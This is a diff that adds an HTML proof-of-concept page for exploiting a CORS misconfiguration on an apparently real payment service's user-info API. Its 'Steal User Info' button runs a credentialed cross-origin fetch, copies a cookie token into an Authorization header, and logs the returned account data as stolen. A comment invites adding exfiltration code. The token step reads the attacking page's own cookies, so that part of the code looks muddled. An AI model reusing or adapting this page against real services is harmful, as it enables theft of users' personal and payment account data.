@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Exploit PoC</title>
+</head>
+<body>
+    <h1>PoC to Exploit CORS Misconfiguration</h1>
+    <button onclick="stealData()">Steal User Info</button>
+
+    <script>
+        function stealData() {
+            // Craft a CORS-enabled request
+            fetch("https://payment.tokomodal.id/api/v1/dashboard/user-info", {
+                method: "GET",
+                headers: {
+                    "Authorization": `Bearer ${document.cookie.match(/token=([^;]+)/)[1]}` // Extract token from cookies and append to Authorization header
+                },
+                credentials: "include" // Ensures cookies are sent along with the request
+            })
+            .then(response => {
+                if (response.ok) {
+                    return response.json();
+                }
+                throw new Error("Network response was not ok.");
+            })
+            .then(data => {
+                console.log("Stolen User Info:", data); // Log stolen data
+                // Data exfiltration logic can be added here
+            })
+            .catch(error => console.error("Error:", error));
+        }
+    </script>
+</body>
+</html>
